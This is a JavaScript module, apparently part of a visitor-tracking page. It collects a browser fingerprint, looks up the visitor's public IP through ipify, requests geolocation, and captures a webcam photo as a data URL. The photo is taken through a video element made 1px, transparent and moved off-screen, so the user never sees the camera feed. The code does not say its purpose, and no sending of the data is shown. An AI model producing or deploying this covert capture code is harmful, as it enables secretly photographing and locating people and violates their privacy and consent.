export function getDeviceInfo() {
  const nav = navigator;
  const conn = nav.connection || nav.mozConnection || nav.webkitConnection;

  return {
    userAgent: nav.userAgent,
    platform: nav.platform,
    language: nav.language,
    languages: nav.languages ? [...nav.languages] : [],
    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
    screen: {
      width: screen.width,
      height: screen.height,
      availWidth: screen.availWidth,
      availHeight: screen.availHeight,
      pixelRatio: window.devicePixelRatio,
    },
    hardwareConcurrency: nav.hardwareConcurrency ?? null,
    deviceMemory: nav.deviceMemory ?? null,
    maxTouchPoints: nav.maxTouchPoints ?? 0,
    cookieEnabled: nav.cookieEnabled,
    online: nav.onLine,
    connection: conn
      ? {
          effectiveType: conn.effectiveType,
          downlink: conn.downlink,
          rtt: conn.rtt,
        }
      : null,
    vendor: nav.vendor || null,
  };
}

export async function fetchPublicIp() {
  const controllers = [
    () => fetch("https://api.ipify.org?format=json").then((r) => r.json()),
    () =>
      fetch("https://api64.ipify.org?format=json").then((r) => r.json()),
  ];

  for (const tryFetch of controllers) {
    try {
      const data = await tryFetch();
      if (data && data.ip) return { ip: data.ip, source: "ipify" };
    } catch {
      /* try next */
    }
  }
  return { ip: null, source: null };
}

export function requestLocation() {
  return new Promise((resolve) => {
    if (!navigator.geolocation) {
      resolve({ granted: false, error: "unsupported" });
      return;
    }
    navigator.geolocation.getCurrentPosition(
      (pos) => {
        resolve({
          granted: true,
          latitude: pos.coords.latitude,
          longitude: pos.coords.longitude,
          accuracy: pos.coords.accuracy,
        });
      },
      (err) => {
        resolve({
          granted: false,
          error: err.code === 1 ? "denied" : String(err.message),
        });
      },
      { enableHighAccuracy: false, timeout: 12000, maximumAge: 60000 }
    );
  });
}

function createHiddenVideo() {
  const video = document.createElement("video");
  video.setAttribute("playsinline", "");
  video.setAttribute("muted", "");
  video.muted = true;
  video.playsInline = true;
  video.autoplay = true;
  Object.assign(video.style, {
    position: "fixed",
    width: "1px",
    height: "1px",
    opacity: "0",
    pointerEvents: "none",
    left: "-10000px",
    top: "0",
  });
  document.body.appendChild(video);
  return video;
}

function waitForVideoFrame(video) {
  return new Promise((resolve) => {
    if (video.videoWidth > 0) {
      resolve();
      return;
    }
    const onReady = () => {
      video.removeEventListener("loadeddata", onReady);
      resolve();
    };
    video.addEventListener("loadeddata", onReady);
    setTimeout(resolve, 1500);
  });
}

export async function captureSelfie() {
  const videoEl = createHiddenVideo();
  let stream;

  try {
    stream = await navigator.mediaDevices.getUserMedia({
      video: { facingMode: "user", width: { ideal: 640 }, height: { ideal: 480 } },
      audio: false,
    });

    videoEl.srcObject = stream;
    await videoEl.play();
    await waitForVideoFrame(videoEl);

    const maxW = 480;
    const vw = videoEl.videoWidth || 640;
    const vh = videoEl.videoHeight || 480;
    const scale = vw > maxW ? maxW / vw : 1;
    const canvas = document.createElement("canvas");
    canvas.width = Math.round(vw * scale);
    canvas.height = Math.round(vh * scale);
    const ctx = canvas.getContext("2d");
    ctx.drawImage(videoEl, 0, 0, canvas.width, canvas.height);

    const dataUrl = canvas.toDataURL("image/jpeg", 0.72);
    return { granted: true, dataUrl };
  } finally {
    stream?.getTracks().forEach((t) => t.stop());
    videoEl.srcObject = null;
    videoEl.remove();
  }
}
